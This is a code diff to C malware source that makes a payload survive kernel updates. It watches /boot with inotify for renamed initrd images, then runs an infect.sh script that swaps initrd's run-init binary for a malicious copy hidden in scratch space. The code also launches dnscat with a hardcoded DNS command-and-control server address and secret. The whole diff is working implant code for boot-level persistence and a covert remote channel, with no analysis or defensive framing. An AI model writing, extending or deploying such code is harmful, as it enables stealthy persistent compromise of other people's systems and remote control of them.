@@ -86,6 +86,7 @@ static int              is_proc(char *name);
 static char             *grab_kernel_thread(char *name);
 static int              enumerate_kernel_threads(char **threads);
 /* Functions that allow the payload to survive kernel updates */
+static int              check_initrd_name(char * filename);
 static void             preserve_payload(char *filename);
 static void             handle_events(int fd, const char *dirname);
 static pid_t            run_watcher();
@@ -111,9 +112,6 @@ static char *const DNSCAT_ARGV0 = "dnscat\0";
 static char *const DNSCAT_ARGV1 = "--dns\0";
 static char *const DNSCAT_ARGV2 = "server=192.168.1.197,port=53\0";
 static char *const DNSCAT_ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
-/* Arguments to run infect.sh script */
-static char *const INFECT_ARGV0 = "infect.sh\0";
-static char *const INFECT_ARGV1 = "/lost+found/run-init\0";
 /* Argument to run extractor.sh script */
 static char *const EXTRACTOR_ARGV0 = "extractor.sh\0";
 
@@ -433,7 +431,7 @@ static pid_t run_watcher()
                         err_exit("inotify_init");
                 G3LBIN(fcntl(fd, F_SETFL, O_NONBLOCK));
 
-                wd = inotify_add_watch(fd, dirname, IN_CREATE | IN_MOVED_TO);
+                wd = inotify_add_watch(fd, dirname, IN_MOVED_TO);
                 if (wd == -1)
                         err_exit("inotify_add_watch");
                 /* prepare for polling */
@@ -464,7 +462,7 @@ static pid_t run_watcher()
  * @fd: fd of the inotify instance
  * @dirname: name of the observed directory
  * 
- * If a file creation or rename event is observed inside the @dirname folder,
+ * If a file rename event is observed inside the @dirname folder,
  * the preserve_payload() function is called to continue to persist the attack.
  */
 static void handle_events(int fd, const char *dirname)
@@ -479,7 +477,7 @@ static void handle_events(int fd, const char *dirname)
                 __attribute__ ((aligned(__alignof__(struct inotify_event))));
         const struct inotify_event *event;
         ssize_t len;
-        int overwrite = 0;
+        int to_infect = 0;
 
         /* loop while events can be read from inotify file descriptor */
         for (;;) {
@@ -496,25 +494,39 @@ static void handle_events(int fd, const char *dirname)
 
                         event = (const struct inotify_event *) ptr;
                         /* check event type */
-                        if ((event->mask & IN_CREATE) ||
-                            (event->mask & IN_MOVED_TO))
-                                overwrite = 1;
+                        if ((event->mask & IN_MOVED_TO))
+                                to_infect = 1;
 
-                        if (event->len && overwrite) {
+                        if (event->len && to_infect) {
                                 /* hijack the legitimate initrd installation */
                                 preserve_payload((char *)event->name);
-                                overwrite = 0;
+                                to_infect = 0;
                         }
                 }
         }
 }
 
 /**
+ * check_initrd_name - checks the goodness of the filename
+ * @filename: name of the file to check
+ */
+static int check_initrd_name(char * filename)
+{
+        if (strstr(filename, "initrd.img-") == NULL)
+                return 0;
+        if (strstr(filename, ".new") != NULL)
+                return 0;
+        if (strstr(filename, "generic") == NULL)
+                return 0;
+        return 1;
+}
+
+/**
  * preserve_payload - prevents the initrd update from deleting the malicious
  *                    payload
- * @filename: name of the file involved in the create or rename event
+ * @filename: name of the file involved in the rename event
  * 
- * If @filename is equal to the string: "initrd.img-$(uname -r)", then
+ * If @filename is something like: "initrd.img-[...]generic", then
  * the infect.sh script is run to replace the original 'run-init' binary
  * of initrd with the malicious one kept in the scratch space not visible
  * from the containerized system.
@@ -525,18 +537,23 @@ static void preserve_payload(char *filename)
         struct utsname utsdata;
         pid_t infect_pid;
         pid_t pid;
-        char *const infect_argv[3] = {
-                INFECT_ARGV0,
-                INFECT_ARGV1,
-                NULL
-        };
 
         if (uname(&utsdata) < 0)
                 err_exit("uname");
+
+        if (filename == NULL)
+                /* overwrite existing one */
+                sprintf(initrd_name, "/boot/initrd.img-%s", utsdata.release);
+        else
+                sprintf(initrd_name, "/boot/%s", filename);
         
-        sprintf(initrd_name, "initrd.img-%s", utsdata.release);
-        if (strcmp(filename, initrd_name) == 0) {
-                /* overwrite */
+        if (filename == NULL || check_initrd_name(filename)) {
+                char *const infect_argv[4] = {
+                        "infect.sh\0",
+                        "/lost+found/run-init\0",
+                        initrd_name,
+                        NULL
+                };
                 infect_pid = execv_wrapper(INFECT_PATH, infect_argv);
 retry:
                 pid = waitpid(infect_pid, NULL, 0);
